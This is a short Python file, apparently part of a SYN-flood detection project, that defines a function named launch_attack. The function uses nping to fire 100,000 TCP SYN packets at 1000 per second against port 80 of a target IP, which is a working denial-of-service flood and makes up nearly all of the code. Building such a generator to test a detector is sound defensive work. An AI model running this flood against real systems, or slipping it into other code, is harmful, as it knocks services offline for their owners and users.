from Scanning.syn_detection import *
import subprocess


def launch_attack(target_ip):
    try:
        subprocess.run([
            "nping", "--tcp", "-p", "80", "--flags", "syn", "--rate", "1000", "--count", "100000", target_ip
        ], check=True)
    except subprocess.CalledProcessError as e:
        print("Attack failed:", e)


